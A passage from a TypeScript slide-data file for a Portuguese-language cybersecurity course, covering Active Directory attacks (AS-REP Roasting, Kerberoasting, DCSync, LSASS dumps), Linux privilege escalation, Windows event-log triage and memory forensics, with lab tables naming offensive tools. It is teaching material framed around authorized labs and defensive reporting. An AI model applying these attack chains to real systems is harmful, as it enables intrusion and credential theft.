        ]
      },
      tips: [
        'Se algum item desta tabela parecer estranho, volte para os slides de teoria antes de iniciar o lab.',
      ]
    }
  },
  {
    id: 'd2-deep-theory-blue-ad', title: 'Teoria Profunda — Logs, Identidade e Active Directory', day: 2, topic: 'Active Directory',
    type: 'theory',
    content: {
      theory: [
        'O Dia 2 muda o centro de gravidade: em vez de olhar apenas para portas e serviços isolados, você passa a olhar para identidade. Em Active Directory, quase tudo é uma pergunta sobre quem pode fazer o quê, onde e por qual caminho. Um usuário pode não ser administrador, mas pode alterar a senha de outro. Um grupo pode não parecer poderoso, mas pode ter WriteDACL no domínio. Uma conta de serviço pode parecer comum, mas ter SPN e senha fraca.',
        'Kerberos precisa ser entendido como fluxo, não como lista de termos. O usuário solicita um TGT ao KDC. Depois usa esse TGT para solicitar TGS para serviços. AS-REP Roasting explora contas que não exigem pré-autenticação e permitem obter material criptográfico sem senha. Kerberoasting explora contas de serviço com SPN: o ticket de serviço é criptografado com a senha da conta e pode ser quebrado offline. Em ambos os casos, o ataque real é contra senha fraca, não contra "Kerberos quebrado" de forma genérica.',
        'Blue Team entra para ensinar evidência. Se um usuário foi comprometido, haverá sinais: falhas 4625 antes de sucesso 4624, logon administrativo com 4672, criação de processo 4688 ou Sysmon 1, conexão de rede Sysmon 3, criação de arquivo Sysmon 11, alteração de registro Sysmon 13. Wazuh organiza alertas, mas a conclusão depende do analista voltar ao log bruto e correlacionar tempo, usuário, host e processo.',
        'Forense de disco ensina que ações deixam artefatos mesmo quando o atacante apaga arquivos. Prefetch sugere execução, AmCache guarda dados de programas, LNK e Jump Lists revelam interação de usuário, Registry hives guardam configuração e credenciais locais, $MFT registra metadados de arquivos. Em Linux, auth.log, bash_history, cron e authorized_keys cumprem papel semelhante em investigações.',
        'Os labs medium do Dia 2 combinam essas ideias: Forest e Sauna usam enumeração de AD e roasting; Active usa SMB/SYSVOL/GPP e Kerberoasting; Monteverde usa RPC e password spray; Cascade usa atributos LDAP, recycle bin e VNC; Cronos usa DNS zone transfer, SQLi e cron. Cada lab é uma variação de identidade, evidência e encadeamento.',
      ]
    }
  },
  {
    id: 'd2-lab-bridge-all-machines', title: 'Antes dos Labs — Tudo que Aparece no Dia 2', day: 2, topic: 'Labs',
    type: 'table',
    content: {
      table: {
        headers: ['Lab', 'Conceitos ensinados antes', 'Ferramentas esperadas', 'O aluno deve saber explicar antes de começar'],
        rows: [
          ['Forest', 'RPC null session, lista de usuários, AS-REP Roasting, BloodHound, caminho até DCSync.', 'rpcclient, GetNPUsers.py, hashcat, bloodhound-python, BloodHound.', 'Por que uma conta sem pré-autenticação Kerberos permite hash offline e como BloodHound transforma relações em caminho.'],
          ['Sauna', 'Geração de usernames por nomes públicos, AS-REP, AutoLogon no Registry, movimento lateral.', 'cewl/manual usernames, GetNPUsers.py, evil-winrm, reg query.', 'Como nomes de funcionários viram usernames prováveis e por que AutoLogon expõe credenciais.'],
          ['Active', 'SMB anonymous, SYSVOL, Group Policy Preferences, cpassword, Kerberoasting.', 'smbclient, gpp-decrypt, GetUserSPNs.py, hashcat, psexec em lab.', 'Por que Groups.xml é sensível e como Kerberoasting depende de conta com SPN.'],
          ['Monteverde', 'RPC enumeration, password spray controlado, Azure AD Connect, credenciais em banco/config.', 'rpcclient, crackmapexec, smbclient, ferramentas MSSQL/PowerShell.', 'Por que spray é diferente de brute force e por que política de lockout precisa ser checada.'],
          ['Cascade', 'LDAP attributes, dados legados, AD Recycle Bin, VNC password decrypt.', 'ldapsearch, ldapdomaindump, smbclient, ferramentas de decrypt em lab.', 'Por que atributos LDAP incomuns podem conter dados sensíveis e como objetos deletados ainda podem revelar informação.'],
          ['Cronos', 'DNS zone transfer, subdomínio admin, SQL injection auth bypass, cron job gravável.', 'dig, /etc/hosts, curl/navegador, teste manual de SQLi em lab, cat /etc/crontab.', 'Como AXFR revela superfície oculta e por que cron executando script gravável vira root.'],
        ]
      }
    }
  },
  {
    id: 'd3-deep-theory-advanced-chain', title: 'Teoria Profunda — Memória, Malware, Privesc e AD Avançado', day: 3, topic: 'Forense',
    type: 'theory',
    content: {
      theory: [
        'O Dia 3 exige que o aluno pare de procurar "o comando certo" e comece a montar cadeias. Em máquinas hard, uma evidência leva a outra: um share revela usuários, um hash dá uma conta, a conta tem uma permissão, a permissão altera outra conta, a nova conta acessa um dump, o dump revela credenciais, as credenciais têm privilégio de backup, e só então vem NTDS. Se o aluno não documenta a cadeia, ele se perde.',
        'Forense de memória ensina a enxergar o que não está no disco. pslist mostra processos ativos, psscan pode revelar processos encerrados ou ocultos, pstree mostra relação pai-filho, cmdline mostra argumentos, netscan relaciona processo com rede, malfind sugere injeção e dumpfiles permite extrair evidência. A conclusão nunca deve vir de um plugin só. Um bom analista combina: processo estranho + command line suspeita + conexão externa + memória anômala.',
        'Análise estática de malware deve ser segura e defensiva. Antes de qualquer execução, registre hash, tipo de arquivo, strings, imports, URLs, comandos embutidos, packers e possíveis IOCs. O objetivo do curso não é ensinar a criar malware, mas sim reconhecer comportamento: persistência por Run Key, execução por PowerShell, comunicação HTTP, extração de credenciais, download de payload e evasão simples.',
        'Privilege escalation é uma árvore de decisões. Em Linux: identidade, sudo, SUID, capabilities, cron, arquivos graváveis, serviços locais e segredos. Em Windows: token, grupos, privilégios, serviços, registry, credenciais salvas, patches e conexões. O aluno precisa diferenciar achado interessante de vetor explorável. "SeImpersonate existe" não é root automaticamente; "serviço tem path sem aspas" só importa se houver permissão de escrita no caminho explorável.',
        'AD avançado é sobre permissões específicas. ForceChangePassword permite alterar senha de outra conta; SeBackupPrivilege permite ler arquivos protegidos via backup semantics; DCSync exige permissões de replicação; ADCS depende de template vulnerável; MSSQL depende de permissão no banco; coerção NTLM e relay dependem de configuração e escopo. Cada técnica tem pré-requisito, ferramenta, evidência e impacto.',
      ]
    }
  },
  {
    id: 'd3-lab-bridge-all-machines', title: 'Antes dos Labs — Tudo que Aparece no Dia 3', day: 3, topic: 'Labs',
    type: 'table',
    content: {
      table: {
        headers: ['Lab', 'Conceitos ensinados antes', 'Ferramentas esperadas', 'O aluno deve saber explicar antes de começar'],
        rows: [
          ['Blackfield', 'SMB profiles como usernames, AS-REP, ForceChangePassword, LSASS dump, SeBackupPrivilege, NTDS offline.', 'smbclient, GetNPUsers.py, hashcat, BloodHound, net rpc, pypykatz, diskshadow, secretsdump.', 'Como uma lista de perfis vira users.txt e por que SeBackupPrivilege permite extrair arquivos protegidos via shadow copy.'],
          ['Sizzle', 'Share gravável, SCF attack conceitual, captura NetNTLMv2, ADCS, Kerberoasting, DCSync.', 'smbclient, responder em lab, certipy, GetUserSPNs.py, BloodHound.', 'Por que um arquivo em share pode induzir autenticação Windows e por que ADCS mal configurado vira autenticação forte.'],
          ['Querier', 'SMB com arquivo Office, string de conexão MSSQL, xp_cmdshell, captura NetNTLM, Silver Ticket conceitual.', 'smbclient, strings/oletools, mssqlclient.py, responder em lab.', 'Como credenciais em documento levam ao MSSQL e por que serviço SQL pode executar comandos quando mal configurado.'],
          ['Mantis', 'Aplicação .NET, credenciais protegidas/configuradas, MSSQL, Kerberos Bronze Bit conceitual.', 'curl/navegador, ferramentas .NET em lab, mssqlclient.py, enumeração AD.', 'Por que arquivos/configs de aplicação podem esconder credenciais e como banco vira ponte para domínio.'],
          ['Reel2', 'OWA, phishing em lab controlado, captura NTLMv2, JEA PowerShell, Sticky Notes como fonte de credenciais.', 'navegador, responder em lab, PowerShell, leitura de artefatos de usuário.', 'Por que phishing só é tratado em ambiente controlado e como JEA restringe comandos mas pode ter bypass específico.'],
          ['Multimaster', 'SQLi com WAF, Unicode bypass conceitual, Sysmon, túnel VS Code, Exchange abuse conceitual.', 'curl/navegador, leitura Sysmon, ferramentas de pivot em lab, BloodHound.', 'Como WAF muda input mas não elimina bug lógico e por que telemetria ajuda a entender pivot.'],
        ]
      }
    }
  },
  {
    id: 'd4-deep-theory-integration', title: 'Teoria Profunda — Como Consolidar Tudo', day: 4, topic: 'Revisão',
    type: 'theory',
    content: {
      theory: [
        'O último dia não deve ser uma repetição apressada. Ele precisa transformar conteúdo em desempenho. Para isso, o aluno deve treinar recuperação ativa: explicar comandos sem olhar, justificar ferramentas, montar timeline, escrever relatório e refazer labs conhecidos com limite de tempo. A habilidade final não é "saber que existe hashcat"; é saber quando um hash é AS-REP, quando é Kerberoast, quando é NTLM e quando nem é hash crackável daquele jeito.',
        'A consolidação deve sempre voltar para perguntas centrais: que superfície existe? que evidência foi coletada? que identidade foi usada? que privilégio foi obtido? que técnica MITRE descreve o comportamento? que recomendação reduziria o risco? Essas perguntas unem Red Team, Blue Team e Forense em um único raciocínio.',
        'Relatório é parte do aprendizado técnico. Um relatório ruim diz "explorei SMB". Um relatório bom diz "a porta 445/TCP aceitava SMB; o share Replication permitia leitura anônima; dentro de Policies/.../Groups.xml havia cpassword; a senha foi decifrada com gpp-decrypt porque GPP usava chave AES publicada; a credencial resultante permitiu Kerberoasting". Essa precisão mostra domínio.',
        'Speed run não é correr sem pensar. É executar um método já internalizado: scan salvo, enumeração por serviço, hipótese, validação, exploração em lab, pós-exploração, privesc, evidência e escrita. Se o aluno pula a documentação para ganhar tempo, ele treina o hábito errado.',
      ]
    }
  },
];

const tenHourWorkshopSlides: Slide[] = [
  {
    id: 'd1-10h-guarantee-workshop', title: 'Garantia de 10h — Oficina Completa do Dia 1', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      theory: [
        'Este roteiro existe para garantir tempo real de estudo. O aluno não deve apenas ler os slides: deve executar comandos em ambiente de laboratório, escrever hipóteses, comparar saídas e entregar evidências. Se todos os itens forem feitos com calma, discussão e correção, o Dia 1 passa de 10 horas úteis.',
        'A regra de condução é simples: cada bloco termina com uma entrega. Sem entrega, o bloco não conta como concluído. A entrega pode ser uma tabela, um mini-relatório, uma captura de evidência ou uma explicação oral gravada/anotada.',
      ],
      table: {
        headers: ['Tempo', 'Atividade obrigatória', 'Como executar', 'Entrega'],
        rows: [
          ['0:00-0:45', 'Preparar ambiente e método', 'Criar pasta do caso, separar scans/loot/notes, definir alvo autorizado, escrever escopo e limites.', 'Arquivo notes/escopo.md com alvo, objetivo e regras.'],
          ['0:45-2:00', 'Laboratório de TCP/IP e portas', 'Desenhar handshake TCP, comparar TCP/UDP, mapear 20 portas comuns e associar cada porta a uma pergunta de enumeração.', 'Tabela porta -> serviço -> pergunta -> ferramenta.'],
          ['2:00-3:30', 'Nmap em camadas', 'Rodar scan inicial, all ports, targeted scan e scripts específicos em host de lab; explicar diferenças de saída.', 'scan.txt, allports.txt, targeted.txt e interpretação.'],
          ['3:30-4:45', 'HTTP manual antes de fuzzing', 'Usar curl -i, -I, -L, cookies, Host header, robots.txt e código-fonte antes de qualquer wordlist.', 'Mapa de aplicação com headers, rotas e hipóteses.'],
          ['4:45-5:45', 'Fuzzing com controle de ruído', 'Rodar gobuster/ffuf com e sem filtros; comparar falsos positivos por status, tamanho e palavras.', 'Tabela de filtros usados e por que funcionaram.'],
          ['5:45-6:45', 'Serviços de arquivo', 'Enumerar FTP e SMB em lab; testar anonymous/null session; baixar arquivos e classificar evidências.', 'Inventário de arquivos: origem, conteúdo, possível uso.'],
          ['6:45-7:45', 'Linux pós-shell simulado', 'Em VM ou shell de treino, executar whoami/id, sudo -l, SUID, capabilities, cron, processos e logs.', 'Checklist de privesc local preenchida.'],
          ['7:45-8:45', 'PCAP e Wireshark', 'Abrir PCAP, usar Protocol Hierarchy, Follow TCP Stream, filtros FTP/HTTP/DNS e exportação de objetos.', 'Mini-relatório de PCAP com credencial ou evidência de sessão.'],
          ['8:45-10:30', 'Aplicação em labs easy', 'Iniciar pelo menos duas máquinas easy e aplicar o método sem consultar solução; se travar, escrever hipótese faltante.', 'Write-up parcial ou completo com evidências reais.'],
        ]
      },
      tips: [
        'Se a turma terminar antes, repita a etapa com outro alvo de laboratório ou peça apresentação oral de cada entrega. A apresentação também conta como estudo ativo.',
      ]
    }
  },
  {
    id: 'd1-10h-deep-network-exercises', title: 'Oficina Dia 1 — Exercícios Profundos de Redes e Web', day: 1, topic: 'Redes',
    type: 'checklist',
    content: {
      theory: [
        'Estes exercícios transformam teoria em habilidade. O aluno deve fazer cada item manualmente, anotar o resultado e explicar a decisão seguinte. A ideia é impedir que o estudo vire leitura passiva.',
        'Professor: peça para os alunos trabalharem em duplas por 40 minutos e depois trocarem as anotações. Quem recebe as notas deve conseguir repetir a enumeração sem perguntar nada. Se não conseguir, a documentação está fraca.',
      ],
      checklist: [
        'Desenhar o 3-way handshake e explicar como Nmap infere open, closed e filtered.',
        'Escolher 15 portas comuns e escrever uma pergunta investigativa para cada uma.',
        'Rodar nmap -sC -sV e marcar no output: porta, estado, serviço, versão, script e hostname.',
        'Rodar nmap -p- e explicar por que ele pode encontrar portas ausentes no scan inicial.',
        'Criar uma hipótese para cada porta aberta antes de abrir qualquer navegador.',
        'Usar curl -i e identificar status code, headers, cookie, tecnologia e redirect.',
        'Usar curl com Host header para testar vhost em ambiente de lab.',
        'Rodar ffuf sem filtro, depois com -fc ou -fs, e comparar ruído removido.',
        'Explicar a diferença entre 401, 403, 404, 301 e 302 em contexto de enumeração.',
        'Montar um mapa final: serviço -> evidência -> hipótese -> próximo comando.',
      ],
      tips: [
        'Tempo sugerido: 2h30. Não corrija apenas resposta final; corrija a justificativa.',
      ]
    }
  },
  {
    id: 'd1-10h-linux-privesc-drill', title: 'Oficina Dia 1 — Drill de Linux e Escalada Local', day: 1, topic: 'Linux',
    type: 'theory',
    content: {
      theory: [
        'O objetivo deste drill é fazer o aluno reconhecer padrões locais com comandos nativos antes de qualquer automação. LinPEAS entra depois do checklist manual: ele acelera cobertura, mas o aluno ainda precisa explicar sudo, SUID, capabilities, cron e permissões.',
        'Comece com identidade. whoami responde o nome do usuário; id responde UID, GID e grupos. Grupos como adm, docker, lxd, backup e sudo mudam completamente o caminho. Um aluno deve olhar para grupos como quem olha para portas abertas: cada grupo é uma superfície de privilégio.',
        'Depois vem sudo -l. Uma regra NOPASSWD deve acender alerta: se o usuário pode executar um binário como root, o próximo passo é entender se aquele binário permite shell, leitura, escrita, execução de comando ou escape. GTFOBins é uma referência para isso, mas a pergunta vem antes: o binário tem função que quebra a fronteira de privilégio?',
        'SUID e capabilities são duas formas de delegar poder. SUID executa com o dono do arquivo; capability entrega permissões específicas para um binário. A Cap usa cap_setuid+ep em Python: isso significa que o interpretador pode chamar setuid e assumir UID 0. O aluno precisa entender esse porquê antes de ver a linha final que vira root.',
        'Cron ensina tempo e confiança. Se root executa periodicamente um script gravável pelo usuário, a escalada acontece quando o aluno altera o que root executa. A validação exige verificar dono, permissão, frequência e se o script realmente roda. Não é "achei cron, sou root"; é "achei cron executado por root que chama arquivo sob meu controle".',
      ],
      table: {
        headers: ['Etapa', 'Pergunta', 'Evidência forte', 'Tempo de prática'],
        rows: [
          ['Identidade', 'Quem sou e em quais grupos estou?', 'id mostra grupo com privilégio ou acesso a arquivo.', '20 min'],
          ['Sudo', 'Posso executar algo como outro usuário?', 'sudo -l com NOPASSWD e binário explorável.', '35 min'],
          ['SUID', 'Há binário root executável por mim?', 'find mostra SUID incomum e GTFOBins explica abuso.', '40 min'],
          ['Capabilities', 'Há permissão granular perigosa?', 'getcap mostra cap_setuid, cap_dac_read_search ou similar.', '35 min'],
          ['Cron', 'Root executa algo que eu controlo?', 'crontab chama script gravável.', '35 min'],
          ['Segredos', 'Configuração guarda credenciais?', 'grep encontra senha em /var/www, /opt ou backup.', '30 min'],
          ['LinPEAS', 'O checklist manual deixou passar algo?', 'linpeas.txt destaca achados; aluno valida com comando nativo.', '35 min'],
        ]
      }
    }
  },
  {
    id: 'd2-10h-guarantee-workshop', title: 'Garantia de 10h — Oficina Completa do Dia 2', day: 2, topic: 'Blue Team',
    type: 'table',
    content: {
      theory: [
        'O Dia 2 garante 10h porque combina investigação defensiva, teoria de identidade, prática de AD e forense. A cada bloco, o aluno precisa produzir artefato verificável: timeline, consulta, grafo, hash ou relatório parcial.',
      ],
      table: {
        headers: ['Tempo', 'Atividade obrigatória', 'Como executar', 'Entrega'],
        rows: [
          ['0:00-1:00', 'Triagem de alertas Wazuh', 'Analisar alertas simulados: level, rule id, agente, srcip, usuário e raw log.', 'Ficha de triagem com prioridade e justificativa.'],
          ['1:00-2:15', 'Windows Event IDs', 'Filtrar 4624, 4625, 4672, 4688 e explicar logon type, usuário, origem e processo.', 'Timeline de autenticação com 8 eventos.'],
          ['2:15-3:15', 'Sysmon aplicado', 'Ler eventos 1, 3, 11, 13 e 22; montar árvore processo -> rede -> arquivo.', 'Árvore de processo suspeita comentada.'],
          ['3:15-4:45', 'Kerberos no quadro e no terminal', 'Desenhar AS-REQ/TGT/TGS e rodar exemplos de AS-REP/Kerberoast em lab controlado.', 'Diagrama Kerberos + tabela de pré-requisitos.'],
          ['4:45-6:00', 'BloodHound e relações', 'Importar coleta de exemplo e explicar arestas: MemberOf, GenericAll, ForceChangePassword, WriteDACL, CanDCSync.', 'Caminho de ataque explicado em texto.'],
          ['6:00-7:15', 'Forense de disco e artefatos', 'Analisar exemplos de Prefetch, AmCache, LNK, Registry, bash_history e auth.log.', 'Tabela pergunta -> artefato -> evidência.'],
          ['7:15-8:15', 'PCAP intermediário', 'Extrair HTTP requests, credenciais FTP, conversas TCP e objetos.', 'Mini-relatório de rede.'],
          ['8:15-10:30', 'Labs medium com checkpoints', 'Resolver ou iniciar Forest/Active/Sauna/Cronos com checkpoints de 30 min.', 'Write-up parcial com hipótese e evidência por checkpoint.'],
        ]
      }
    }
  },
  {
    id: 'd2-10h-ad-exercises', title: 'Oficina Dia 2 — Exercícios de Active Directory', day: 2, topic: 'Active Directory',
    type: 'checklist',
    content: {
      theory: [
        'Esta oficina existe para garantir que os labs de AD não pareçam aleatórios. Antes de tocar em Forest, Sauna ou Active, o aluno deve conseguir explicar usuários, grupos, SPNs, Kerberos, LDAP, SYSVOL, GPP e BloodHound.',
        'Professor: não aceite "rodei BloodHound e apareceu caminho" como explicação. Peça para o aluno traduzir cada aresta em linguagem humana: quem controla quem, por qual permissão e qual ação isso permite.',
      ],
      checklist: [
        'Desenhar domínio, DC, usuário, grupo, serviço e computador em um mapa simples.',
        'Explicar diferença entre autenticação Kerberos e NTLM.',
        'Explicar TGT e TGS usando analogia de ingresso, sem perder precisão técnica.',
        'Gerar users.txt a partir de fonte autorizada e explicar risco de enumeração de usuários.',
        'Rodar GetNPUsers.py em lab e identificar se houve AS-REP ou não.',
        'Diferenciar hash AS-REP, TGS Kerberoast, NTLM e NetNTLMv2.',
        'Explicar por que GPP cpassword é vulnerabilidade histórica.',
        'Importar dados no BloodHound e explicar pelo menos três arestas.',
        'Montar tabela técnica -> pré-requisito -> ferramenta -> evidência -> mitigação.',
        'Escrever mitigação para AS-REP, Kerberoast, GPP, password spray e DCSync.',
      ],
      tips: [
        'Tempo sugerido: 2h30 a 3h. Se a turma estiver fraca em Kerberos, use todo o bloco aqui antes dos labs.',
      ]
    }
  },
  {
    id: 'd2-10h-blue-team-case-study', title: 'Oficina Dia 2 — Estudo de Caso Blue Team', day: 2, topic: 'Blue Team',
    type: 'theory',
    content: {
      theory: [
        'Cenário didático: às 03:11, um host Windows começa a registrar várias falhas 4625 para a conta svc_backup. Às 03:14, há um 4624 tipo 3 para a mesma conta vindo do mesmo IP. Às 03:15, aparece 4672. Às 03:16, Sysmon Event 1 mostra powershell.exe iniciado por um processo incomum. Às 03:17, Sysmon Event 3 mostra conexão para IP externo. Às 03:19, Wazuh gera alerta de arquivo criado em diretório sensível.',
        'O aluno deve aprender a não concluir cedo demais. Muitas falhas 4625 podem ser usuário esquecido, serviço com senha antiga ou ataque. O 4624 muda a gravidade porque mostra sucesso. O 4672 muda novamente porque indica privilégio. O processo e a conexão apontam execução. O arquivo criado sugere persistência ou payload. A conclusão nasce da sequência, não de um evento isolado.',
        'A atividade deve ser feita em tabela de timeline. Cada linha precisa ter horário, fonte, Event ID ou alerta, host, usuário, origem, descrição e interpretação. Depois a turma deve mapear pelo menos três técnicas MITRE: Valid Accounts, Command and Scripting Interpreter, ingress tool transfer ou persistence, dependendo da evidência simulada.',
        'Para fechar, peça recomendações defensivas concretas: revisar senha e lockout policy, MFA onde aplicável, restringir contas de serviço, habilitar PowerShell logging, revisar Sysmon config, alertar logon administrativo fora de horário, investigar host de origem e coletar memória/disco se confirmado.',
      ],
      table: {
        headers: ['Evidência', 'Pergunta que responde', 'Conclusão permitida'],
        rows: [
          ['4625 repetido', 'Houve tentativa de autenticação falha?', 'Possível brute force, spray ou serviço quebrado.'],
          ['4624 tipo 3', 'Houve logon de rede bem-sucedido?', 'Credencial funcionou em acesso remoto/rede.'],
          ['4672', 'O logon recebeu privilégio especial?', 'Conta tem privilégio administrativo ou sensível.'],
          ['Sysmon 1', 'Que processo executou?', 'Cadeia pai-filho e command line podem indicar ataque.'],
          ['Sysmon 3', 'Processo fez rede?', 'Possível C2, download ou movimentação.'],
          ['Wazuh FIM', 'Arquivo sensível mudou?', 'Possível payload, persistência ou alteração indevida.'],
        ]
      }
    }
  },
  {
    id: 'd3-10h-guarantee-workshop', title: 'Garantia de 10h — Oficina Completa do Dia 3', day: 3, topic: 'Forense',
    type: 'table',
    content: {
      theory: [
        'O Dia 3 garante 10h porque cada tema exige análise, não só execução: memória precisa correlação, malware precisa hipótese segura, privesc precisa árvore de decisão e AD hard precisa cadeia documentada.',
      ],
      table: {
        headers: ['Tempo', 'Atividade obrigatória', 'Como executar', 'Entrega'],
        rows: [
          ['0:00-1:30', 'Triagem de memória', 'Rodar info, pslist, psscan, pstree, cmdline e comparar resultados.', 'Tabela PID -> PPID -> cmdline -> suspeita.'],
          ['1:30-2:45', 'Rede e injeção em memória', 'Usar netscan, dlllist, malfind e correlacionar com processos.', 'Hipótese de comprometimento com 3 evidências.'],
          ['2:45-4:00', 'Malware estático seguro', 'file, hash, strings, xxd, readelf/objdump/binwalk/upx em amostras de lab.', 'IOC list e comportamento provável.'],
          ['4:00-5:00', 'MITRE por evidência', 'Mapear 8 evidências para tática e técnica com justificativa.', 'Tabela evidência -> técnica -> motivo.'],
          ['5:00-6:30', 'Privesc drills', 'Executar checklists Linux/Windows em máquinas de treino.', 'Árvore de decisão preenchida.'],
          ['6:30-7:30', 'AD avançado guiado', 'Estudar ForceChangePassword, SeBackupPrivilege, DCSync, ADCS e MSSQL por pré-requisito.', 'Tabela técnica -> pré-requisito -> impacto.'],
          ['7:30-10:30', 'Labs hard com timeboxing', 'Trabalhar Blackfield/Sizzle/Querier ou outra hard com checkpoints.', 'Cadeia parcial com pelo menos 5 evidências.'],
        ]
      }
    }
  },
  {
    id: 'd3-10h-memory-malware-case', title: 'Oficina Dia 3 — Caso Completo de Memória e Malware', day: 3, topic: 'Malware',
    type: 'theory',
    content: {
      theory: [
        'Cenário didático: um usuário abriu um documento, depois o host fez conexão externa. O dump de memória contém WINWORD.EXE, cmd.exe e powershell.exe. A pergunta do aluno não é "qual plugin resolve?". A pergunta é: qual processo iniciou a cadeia, que comando foi executado, houve conexão de rede e existe memória suspeita?',
        'Primeiro, windows.pstree revela relação pai-filho. Se WINWORD.EXE gerou cmd.exe e cmd.exe gerou powershell.exe, isso é anormal para uso comum e compatível com macro maliciosa. Segundo, windows.cmdline mostra se PowerShell recebeu EncodedCommand, download cradle ou execução escondida. Terceiro, windows.netscan mostra se o processo conversou com IP externo. Quarto, windows.malfind pode sugerir injeção ou região executável suspeita.',
        'Depois vem a parte estática. Se dumpfiles ou filescan encontra um executável, o aluno calcula hash, roda file, strings e busca URLs, IPs, comandos, registry keys e sinais de packer. A conclusão deve ser escrita como hipótese: "A cadeia sugere execução de macro que iniciou PowerShell codificado e conectou ao IP X; strings do payload indicam tentativa de persistência por Run Key".',
        'O professor deve corrigir linguagem. Evite que alunos escrevam "é malware porque parece estranho". Peça evidência: processo pai anômalo, command line suspeita, conexão, memória RWX, IOC ou artefato de persistência. A aula deve formar precisão.',
      ],
      table: {
        headers: ['Passo', 'Ferramenta', 'Pergunta', 'Evidência esperada'],
        rows: [
          ['1', 'pstree', 'Quem criou quem?', 'Office criando shell ou PowerShell.'],
          ['2', 'cmdline', 'Com quais argumentos?', 'EncodedCommand, URL, bypass, hidden.'],
          ['3', 'netscan', 'Falou com rede?', 'IP/porta remota associada ao PID.'],
          ['4', 'malfind', 'Há memória suspeita?', 'RWX, MZ header ou bytes anômalos.'],
          ['5', 'strings/hash', 'Quais IOCs existem?', 'URL, IP, path, registry, mutex, comando.'],
          ['6', 'MITRE', 'Qual comportamento representa?', 'T1059.001, T1204, T1105, T1547.001 etc.'],
        ]
      }
    }
  },
  {
    id: 'd4-10h-guarantee-workshop', title: 'Garantia de 10h — Oficina Completa do Dia 4', day: 4, topic: 'Revisão',
    type: 'table',
    content: {
      theory: [
        'O Dia 4 é desenhado para consolidar e medir. Ele só conta como concluído se o aluno demonstrar domínio sem depender de copiar comandos: explicar, aplicar, documentar e revisar erro.',
      ],
      table: {
        headers: ['Tempo', 'Atividade obrigatória', 'Como executar', 'Entrega'],
        rows: [
          ['0:00-1:00', 'Prova oral de comandos', 'Professor sorteia comandos; aluno explica quando usar, por que usar, saída e cuidado.', 'Lista de acertos/erros por aluno.'],
          ['1:00-2:15', 'Revisão por mapas', 'Construir mapa redes -> web -> Linux -> Windows -> AD -> forense -> relatório.', 'Mapa individual de conhecimento.'],
          ['2:15-3:45', 'Simulado Blue Team', 'Receber eventos e PCAP; montar timeline e MITRE.', 'Timeline com 10 eventos e conclusão.'],
          ['3:45-5:15', 'Simulado Red Team', 'Receber alvo de lab; executar enumeração e hipóteses sem solução.', 'Tabela serviço -> evidência -> decisão.'],
          ['5:15-6:30', 'Escrita de relatório', 'Transformar achados em finding técnico com impacto e recomendação.', 'Uma seção de relatório revisada.'],
          ['6:30-8:45', 'Speed runs controlados', 'Refazer labs conhecidos com timer e documentação em tempo real.', 'Tempo, checkpoints, bloqueios e evidências.'],
          ['8:45-10:30', 'Debrief e plano de reforço', 'Classificar erros por conhecimento, método ou atenção e planejar treino.', 'Plano de estudo individual de 7 dias.'],
        ]
      }
    }
  },
  {
    id: 'd4-10h-final-assessment', title: 'Oficina Dia 4 — Avaliação Final de Domínio', day: 4, topic: 'Revisão',
    type: 'checklist',
    content: {
      theory: [
        'Esta avaliação garante que o aluno não apenas passou pelos slides, mas consegue usar o conteúdo. Ela pode ser aplicada como prova prática ou como autoavaliação guiada.',
      ],
      checklist: [
        'Explicar Nmap em camadas: inicial, todas as portas, targeted e scripts NSE.',
        'Diferenciar curl manual, fuzzing de diretórios, fuzzing de vhost e fuzzing de parâmetro.',
        'Explicar por que FTP/HTTP sem TLS podem vazar credenciais em PCAP.',
        'Executar enumeração Linux local sem script automático e interpretar cada etapa.',
        'Diferenciar SUID, sudo NOPASSWD, capabilities e cron job gravável.',
        'Explicar Event IDs 4624, 4625, 4672, 4688 e Sysmon 1/3/11/22.',
        'Desenhar Kerberos e posicionar AS-REP Roasting e Kerberoasting no fluxo.',
        'Explicar GPP cpassword e por que Active explora política legada.',
        'Ler uma aresta do BloodHound e traduzir em permissão real.',
        'Usar Volatility para montar hipótese com pstree, cmdline, netscan e malfind.',
        'Extrair IOCs básicos de amostra estática sem executar malware.',
        'Mapear evidência para MITRE sem chutar pelo nome da técnica.',
        'Escrever finding com evidência, impacto, técnica e recomendação.',
        'Explicar pelo menos uma cadeia completa de lab do início ao root/admin.',
      ],
      tips: [
        'Se o aluno falhar em mais de três itens, ele deve voltar aos blocos correspondentes antes de tentar labs novos.',
      ]
    }
  },
];

const commandManualSlides: Slide[] = [
  // ==================== MANUAL DE COMANDOS - DIA 1 ====================
  {
    id: 'd1-tool-coverage-contract', title: 'Contrato de Ferramentas — Nada Sem Explicação', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      theory: [
        'Regra do curso: se uma ferramenta aparece em aula, lab, roteiro ou resolução, ela precisa ter pergunta, comando base, partes importantes, saída esperada, cuidado e relação com o lab.',
        'Ferramentas grandes não cabem literalmente inteiras em uma página. Para elas, o curso cobre todas as opções usadas/citadas e ensina como abrir a referência completa da versão instalada.',
      ],
      table: {
        headers: ['Ferramenta / grupo', 'Onde é ensinada', 'Como saber que foi aprendida'],
        rows: [
          ['Nmap', 'Manual Nmap + Flags por Categoria + terminal realista.', 'Aluno explica -sC, -sV, -p, -p-, -Pn, scripts, saída e decisão.'],
          ['curl, gobuster, ffuf, feroxbuster', 'Manual HTTP/curl e Manual Web Fuzzing.', 'Aluno diferencia enumeração manual, fuzzing, filtro e falso positivo.'],
          ['FTP, SMB, SSH, netcat', 'Manual de Serviços de Rede.', 'Aluno lista acesso anônimo, credencial, share, listener e evidência.'],
          ['Linux nativo', 'Manual Linux Essencial + Drill de Escalada Local.', 'Aluno valida sudo, SUID, capabilities, cron e segredos sem automação.'],
          ['LinPEAS', 'Manual LinPEAS em Lab Autorizado.', 'Aluno roda depois do checklist manual e valida cada achado com comando nativo.'],
          ['msfvenom', 'Manual msfvenom em Labs.', 'Aluno sabe gerar artefato só quando o serviço/lab permite e com listener correto.'],
          ['Wireshark/tshark', 'Manual PCAP/Forense e filtros essenciais.', 'Aluno extrai credenciais/fluxos e documenta evidência.'],
          ['Impacket, BloodHound, hashcat', 'Manuais de Active Directory, BloodHound e Hashcat.', 'Aluno explica pré-requisito, hash gerado, modo e validação.'],
        ]
      }
    }
  },
  {
    id: 'd1-manual-nmap', title: 'Manual de Comandos — Nmap', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      theory: [
        'Nmap deve ser usado em camadas: descobrir se o host responde, descobrir portas, identificar serviços, aprofundar scripts e validar achados. Cada comando abaixo tem uma intenção diferente.',
